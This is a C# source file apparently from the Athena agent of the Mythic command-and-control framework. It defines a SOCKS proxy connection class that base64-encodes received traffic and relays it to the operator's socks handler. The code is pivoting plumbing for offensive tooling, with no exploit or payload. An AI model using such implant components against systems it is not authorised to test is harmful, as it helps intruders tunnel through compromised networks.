using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System.Net.Sockets;
using TcpClient = Athena.Models.Athena.Socks.TcpClient;

namespace Athena.Commands
{
    public class SocksConnection : TcpClient
    {
        public byte[] dstportBytes { get; set; }
        public byte[] dstBytes { get; set; }
        public byte[] bndPortBytes { get; set; }
        public byte[] bndBytes { get; set; }
        public byte addressType { get; set; }
        public int server_id { get; set; }
        public bool listening { get; set; }
        public bool exited { get; set; }

        public SocksConnection(ConnectionOptions co) : base(co.ip, co.port)
        {
            this.dstBytes = co.dstBytes;
            this.dstportBytes = co.dstportBytes;
            this.bndPortBytes = co.bndPortBytes;
            this.bndBytes = co.bndBytes;
            this.addressType = co.addressType;
            this.server_id = co.server_id;
        }

        protected override void OnReceived(byte[] buffer, long offset, long size)
        {
            SocksMessage smOut = new SocksMessage()
            {
                server_id = this.server_id,
                data = Misc.Base64Encode(buffer),
                exit = false
            };
            Globals.socksHandler.ReturnMessage(smOut);
        }
        protected override void OnError(SocketError error)
        {
        }
        protected override void OnConnected()
        {
        }
        protected override void OnDisconnected()
        {
            SocksMessage smOut = new SocksMessage()
            {
                server_id = this.server_id,
                data = "",
                exit = true
            };
            Globals.socksHandler.ReturnMessage(smOut);
            this.exited = true;
        }
    }
}
